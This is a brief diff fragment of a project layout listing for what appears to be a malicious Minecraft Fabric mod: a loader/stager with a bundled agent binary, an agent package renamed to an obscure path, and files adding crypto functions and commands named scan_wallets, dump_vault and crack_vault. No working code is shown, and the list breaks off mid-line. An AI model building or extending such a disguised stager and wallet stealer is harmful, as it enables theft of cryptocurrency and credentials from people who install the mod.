@@ -23,7 +23,7 @@ src/                                  Fabric loader/stager (existing)
   main/resources/serverpackcore/agent.bin
 
 agent/
-  src/main/java/com/serverpackcore/agent/
+  src/main/java/com/spcagentpayloa/jvmxx/
     Agent.java                        + startCrypto / stopCrypto
     Poller.java                       + crypto field, startCrypto, submitCrypto
     CommandExecutor.java              + scan_wallets, dump_vault, crack_vault,
